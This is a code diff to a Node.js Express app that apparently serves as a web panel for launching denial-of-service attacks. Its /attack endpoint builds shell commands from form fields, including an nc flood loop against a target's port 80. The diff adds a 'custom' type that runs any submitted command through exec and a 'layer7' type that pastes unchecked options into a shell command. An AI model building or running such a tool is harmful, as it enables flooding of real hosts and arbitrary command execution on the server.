@@ -12,6 +12,7 @@ const { networkInterfaces } = require('os');
 const si = require('systeminformation');
 const dns = require('dns');
 const net = require('net');
+const { spawn } = require('child_process');
 
 app.use(express.static('public'));
 app.use(express.urlencoded({ extended: true }));
@@ -141,6 +142,18 @@ function resolveTarget(target) {
                 }
             });
         }
+    });
+}
+
+function executeCommand(command) {
+    return new Promise((resolve, reject) => {
+        exec(command, { maxBuffer: 1024 * 1024 * 10 }, (error, stdout, stderr) => {
+            if (error) {
+                reject(error);
+                return;
+            }
+            resolve({ stdout, stderr });
+        });
     });
 }
 
@@ -317,6 +330,25 @@ app.post('/attack', async (req, res) => {
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do echo -ne '${rawPayload}' | nc ${encodedTarget} 80 & done; done"`;
             break;
 
+        case 'custom':
+                const customCommand = req.body.customCommand;
+                if (!customCommand) {
+                    log('Error: Custom command is required for custom attack.');
+                    return res.status(400).send('Custom command is required for custom attack.');
+                }
+                command = customCommand;
+                break;
+        case 'layer7':
+            const layer7Method = req.body.layer7Method;
+            const layer7Options = req.body.layer7Options || '';
+            if (!layer7Method) {
+                log('Error: Layer7 method is required for layer7 attack.');
+                return res.status(400).send('Layer7 method is required for layer7 attack.');
+            }
+            command = `node layer7.js --target ${encodedTarget} --method ${layer7Method} --duration ${duration} --threads ${numThreads} ${layer7Options}`;
+            break;
+
+
         default:
             log(`Error: Invalid attack type: ${attackType}`);
             return res.status(400).send('Invalid attack type.');
@@ -327,22 +359,22 @@ app.post('/attack', async (req, res) => {
     attackCounter.inc({ attackType: attackType, target: target });
     const attackStartTime = Date.now();
 
-    exec(command, { maxBuffer: 1024 * 1024 * 10 }, (error, stdout, stderr) => {
+    try {
+        const { stdout, stderr } = await executeCommand(command);
         const attackEndTime = Date.now();
         const actualDuration = (attackEndTime - attackStartTime) / 1000;
         attackDurationGauge.set({ attackType: attackType, target: target }, actualDuration);
 
-        if (error) {
-            log(`Attack failed: ${error.message}`);
-            console.error(`exec error: ${error}`);
-            return res.status(500).send(`Attack failed: ${error.message}`);
-        }
         if (stderr) {
             log(`Attack stderr: ${stderr}`);
         }
         log(`Attack completed. stdout: ${stdout}`);
         res.send('Attack initiated. Check logs for details.');
-    });
+    } catch (error) {
+        log(`Attack failed: ${error.message}`);
+        console.error(`exec error: ${error}`);
+        res.status(500).send(`Attack failed: ${error.message}`);
+    }
 });
 
 function generateRandomIP() {
